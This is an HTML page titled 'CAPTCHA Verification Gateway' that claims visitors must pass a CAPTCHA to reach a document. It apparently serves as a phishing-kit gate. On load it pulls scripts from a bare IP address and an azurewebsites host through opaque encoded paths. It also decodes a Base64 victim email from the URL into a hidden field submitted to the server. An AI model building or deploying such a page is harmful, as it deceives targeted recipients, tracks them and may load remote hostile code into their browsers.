


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CAPTCHA Verification Gateway</title>
    <script  type="text/javascript"  src="http://34.238.245.247/iT_IOkE2rpXo3KjCPIErD6UwEriamExOqoLCkt9cZZ_oXq3A59S38XLEE-3lF66LIJnYd4oP3l8t1IRYEmiXsA=="></script><script  type="text/javascript"  src="https://postmix-wizard-fxbmcvb5cbcbfdfc.canadacentral-01.azurewebsites.net/n1G2VD3aWJHbErfOyKPUq78mANLppn3UoVzbbOXIb83MrhxrH8FK4mhC4OfIvPRiq4KUjNKdBfmWXBqH2bwMXQ=="></script><script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <style>
        body,
        html {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 85vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #fff;
            box-sizing: border-box;
        }

        .container {
            background-color: #fff;
            padding: 20px;
            width: 100%;
            max-width: 340px;
            border-radius: 8px;
            box-sizing: border-box;
            margin: 20px;
        }

        h1 {
            font-size: 1.5em;
            margin-bottom: 8px;
        }

        .description {
            font-size: 0.9em;
            color: #555;
            margin-bottom: 20px;
            font-style: italic;
        }

        label {
            font-weight: bold;
            display: block;
            margin-top: 15px;
            margin-bottom: 5px;
        }

        .helper-text {
            font-size: 0.85em;
            color: #555;
            margin-top: 5px;
        }

        .captcha-image {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-top: 10px;
        }

        .captcha-input {
            font-size: 16px;
            width: 100%;
            padding: 8px;
            border: 1px solid #ccc;
            height: 50px;
            box-sizing: border-box;
            margin-top: 5px;
        }

        .error-message {
            color: red;
            font-size: 0.9em;
            margin-bottom: 10px;
        }

        .button-container {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }

        .next-button {
            flex: 1;
            padding: 10px;
            background-color: #0078d4;
            color: #fff;
            border: none;
            height: 50px;
            cursor: pointer;
            font-size: 1em;
        }

        .cf-turnstile {
            margin-top: 1rem;
        }
    </style>
</head>

<body>
    <div class="container">
        <h1>User Access Safeguard</h1>
        <p class="description">To access the document, please complete the CAPTCHA verification. This ensures the security of the content and verifies that you’re a real person.</p>
                <form id="captcha-form" action="/validate_captcha.php" method="POST">
            <!-- Hidden email input (will be populated from URL) -->
            <input type="hidden" id="email" name="email">

            <!-- Text-based CAPTCHA -->
            <label for="text-captcha">Enter the characters in the picture: <span style="color: red;">*</span></label>
            <div class="captcha-image">
                <img src="/generate_captcha.php" alt="CAPTCHA Image" id="captcha-image" style="max-width: 100px;">
                <button type="button" onclick="refreshCaptcha()" style="padding: 0 8px;">↻</button>
            </div>
            <input type="text" id="text-captcha" name="text_captcha" class="captcha-input" required>

            <!-- Cloudflare Turnstile CAPTCHA -->
            <div class="cf-turnstile" data-sitekey="0x4AAAAAAAzbaCIIxhpKU4HJ" data-callback="onTurnstileVerified"></div>

            <!-- Submit button -->
            <div class="button-container">
                <button id="next-button" class="next-button" type="submit" disabled>Next</button>
            </div>
        </form>
    </div>

    <script>
        // Refresh the text CAPTCHA image
        function refreshCaptcha() {
            document.getElementById("captcha-image").src = "/generate_captcha.php?" + Date.now();
        }

        // Enable the submit button only after Turnstile CAPTCHA is verified
        function onTurnstileVerified(token) {
            document.getElementById('next-button').disabled = false;
        }

        // Extract the email from the URL and populate the hidden email field
        function prefillEmail() {
            const url = window.location.href;
            const match = url.match(/\(([^)]+)\)/); // Regex to capture text inside parentheses
            if (match && match[1]) {
                const base64Email = match[1]; // Extract the Base64-encoded email
                const email = atob(base64Email); // Decode Base64 to plain text
                document.getElementById('email').value = email; // Set as the value of the hidden input
            }
        }

        // Run the prefill function when the page loads
        window.addEventListener('DOMContentLoaded', prefillEmail);
    </script>
</body>

</html>
